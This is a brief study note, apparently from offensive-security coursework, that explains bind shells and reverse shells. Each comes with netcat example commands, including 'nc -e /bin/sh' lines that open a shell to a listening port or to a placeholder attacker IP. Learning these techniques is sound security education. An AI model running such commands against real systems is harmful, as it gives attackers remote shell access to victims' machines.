**Bind shell**
	- Here the attacker's machine is made to connect with the victim's machine.
	- Exploits are made to run on the victims machine and made to be listening for services establishing shell
	- for example:
		- Attacker's machine: nc <target_ip> 4444
		- Target machine: nc -lvp 4444 -e /bin/sh
	- It is used when the attacker is facing issues with the firewall and such
	- It is also used when the attacker has no success with the reverse shell.

**Reverse shell**
	- Here the victims machine is made to connect to the attacker's machine getting shell access.
	- Exploits are made to run on the victim's machine and made to make connection to the attacker's machine
	- for example:
		- Attacker's machine: nc -lvp 4444
		- Target machine: nc <attacker's_ip> -e /bin/sh
